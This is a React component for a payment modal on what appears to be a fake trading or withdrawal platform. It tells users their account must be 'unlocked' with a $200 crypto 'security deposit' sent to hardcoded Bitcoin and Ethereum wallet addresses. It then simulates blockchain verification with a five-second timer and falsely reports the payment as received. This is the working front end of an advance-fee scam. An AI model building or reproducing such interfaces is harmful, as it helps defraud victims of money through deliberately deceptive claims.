import React, { useState } from "react";

// Payment details data for easy management
const PAYMENT_OPTIONS = {
  bitcoin: {
    name: "Bitcoin (BTC)",
    address: "bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7",
    amount: "$200.00",
    note: "Please send the exact amount of $200.00 USD worth of Bitcoin to the wallet address below.",
  },
  ethereum: {
    name: "Ethereum (ETH)",
    address: "0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA",
    amount: "$200.00",
    note: "Please send the exact amount of $200.00 USD worth of Ethereum to the wallet address below.",
  },
  usdt: {
    name: "USDT (ERC-20)",
    address: "0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA",
    amount: "$200.00",
    note: "Please send the exact amount of $200.00 USD worth of USDT (ERC-20) to the wallet address below.",
  },
};

export default function PaymentModal({ onClose }) {
  // State to manage which step of the modal the user is on
  const [step, setStep] = useState('select_method'); // 'select_method', 'show_details', 'loading', 'confirmed'
  const [selectedMethod, setSelectedMethod] = useState(null);

  const handleMethodChange = (e) => {
    const methodKey = e.target.value;
    if (methodKey) {
      setSelectedMethod(PAYMENT_OPTIONS[methodKey]);
      setStep('show_details'); // Move to details step
    }
  };

  const handleSent = () => {
    setStep('loading'); // Show loading state

    // Simulate the 5-second confirmation process
    setTimeout(() => {
      setStep('confirmed'); // Move to final confirmation screen
    }, 5000); // 5 seconds
  };
  
  const handleClose = () => {
    // Reset state and close the modal
    setStep('select_method');
    setSelectedMethod(null);
    onClose();
  };

  // --- Step 1: Select Payment Method ---
  if (step === 'select_method') {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>🔐 Account Unlock Required</h3>
          <p>
            To activate your withdrawal and fully unlock your account, a small security deposit is required.
          </p>
          
          <div className="form-card" style={{ padding: '0', marginTop: '20px' }}>
            <label htmlFor="payment-method" className="note" style={{ display: 'block', textAlign: 'left', marginBottom: '5px' }}>
              Select Payment Method
            </label>
            <select
              id="payment-method"
              onChange={handleMethodChange}
              defaultValue=""
              style={{ width: '100%', padding: '10px', border: '1px solid #ddd', borderRadius: '6px' }}
            >
              <option value="" disabled>Choose Crypto Currency</option>
              <option value="bitcoin">Bitcoin (BTC)</option>
              <option value="ethereum">Ethereum (ETH)</option>
              <option value="usdt">USDT (ERC-20)</option>
            </select>
          </div>

          <div className="btn-group" style={{ marginTop: '25px' }}>
            <button onClick={handleClose} className="btn-secondary">
              Cancel
            </button>
          </div>
        </div>
      </div>
    );
  }
  
  // --- Step 2: Payment Details View (Dynamic) ---
  if (step === 'show_details' && selectedMethod) {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>Send {selectedMethod.name}</h3>
          <p className="note" style={{ marginBottom: '15px' }}>
            {selectedMethod.note}
          </p>
          
          <p style={{ fontWeight: 'bold', fontSize: '1.2rem', color: '#e74c3c' }}>
            Amount Required: {selectedMethod.amount}
          </p>
          
          <p className="note" style={{ marginTop: '15px', textAlign: 'left' }}>
            Wallet Address ({selectedMethod.name}):
          </p>
          <div className="btc-box">
            {selectedMethod.address}
          </div>
          
          <p className="warning">
            WARNING: Ensure you send the exact amount to the specified address.
          </p>
          
          <div className="btn-group">
            <button onClick={() => setStep('select_method')} className="btn-secondary">
              Back
            </button>
            <button onClick={handleSent} className="btn-primary">
              I Have Sent Payment
            </button>
          </div>
        </div>
      </div>
    );
  }

  // --- Step 3: Loading Screen View ---
  if (step === 'loading') {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <div style={{ fontSize: '3rem', color: '#007bff' }}>
            {/* Simple professional loading spinner placeholder */}
            <span className="logo-icon" style={{ 
                animation: 'spin 1s linear infinite', 
                backgroundColor: 'transparent',
                color: '#007bff',
                border: '3px solid #007bff',
                borderRadius: '50%',
                width: '40px',
                height: '40px',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '1.5rem',
                fontWeight: 'bold'
            }}>
                <svg className="animate-spin h-5 w-5 text-current" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" style={{ animation: 'spin 1s linear infinite' }}>
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
            </span>
          </div>
          <h3 style={{ marginTop: '20px' }}>Processing Payment...</h3>
          <p className="note">
            Verifying transaction on the blockchain. This may take a moment.
          </p>
        </div>
      </div>
    );
  }

  // --- Step 4: Final Confirmation View ---
  if (step === 'confirmed') {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>✅ Payment Confirmation Received</h3>
          <p>
            Thank you for initiating the transfer.
            **We will confirm your payment shortly** and process your withdrawal.
          </p>
          <div className="btn-group">
            <button onClick={handleClose} className="btn-primary">
              Close Dashboard
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Should theoretically not be reached, but needed for compilation
  return null;
}
